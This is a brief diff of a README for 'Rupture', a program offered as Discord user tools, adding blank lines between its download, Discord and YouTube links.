@@ -3,7 +3,9 @@ Rupture is a program that offers a variety of reliable tools for Discord users. 
 
 ## Download
 [Rupture](https://github.com/iMewIRL/ruptureloader/files/10461103/Rupture.zip)
+
 [Discord](https://discord.gg/NvnSf4Yuyx)
+
 [Youtube](https://www.youtube.com/@iMewIRL/videos)
 
 ## Features
